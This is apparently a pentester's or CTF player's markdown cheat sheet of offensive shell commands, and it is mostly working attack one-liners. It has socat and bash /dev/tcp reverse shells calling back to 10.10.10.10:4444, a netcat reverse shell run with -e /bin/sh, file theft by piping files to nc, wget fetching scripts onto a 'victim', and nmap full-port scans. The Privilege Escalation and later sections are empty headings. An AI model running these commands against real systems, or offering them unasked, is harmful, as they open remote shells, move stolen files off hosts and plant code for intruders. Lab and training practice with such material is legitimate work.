# Useful Commands

## Create web server

### With Python

```
python3 -m http.server 8888
``` 

```
python -m SimpleHTTPServer 8888
```

## Upgrade reverse shell

### With Socat

*Victim:* 
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
chmod +x socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
        
*Kali:*
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### With Python

*Victim:* 
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Send files

### With netcat

*Victim:*
```
cat file.txt | nc -q 0 10.10.10.10 4444
```

*Kali:*
```
nc -lvp 4444 > file.txt
```

### With web server

*Kali:*
```
python3 -m http.server 8888 
```

```
python -m SimpleHTTPServer 8888
```

*Victim:* 
```
wget http://10.10.10.10:8888/something.sh -O something.sh
```

## Reverse shells

### With bash

```
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

```
nc -lvp 4444
```

### With netcat

```
nc -e /bin/sh 10.10.10.10 4444
```

```
nc -lvp 4444
```

# Enumeration

### Nmap

TCP Scan:

```
nmap -sV -sC -p- 10.10.10.77
```

UDP Scan:

```
nmap -sU -sV -p- 10.10.10.77
```

# Privilege Escalation

# Some Scripts

# References
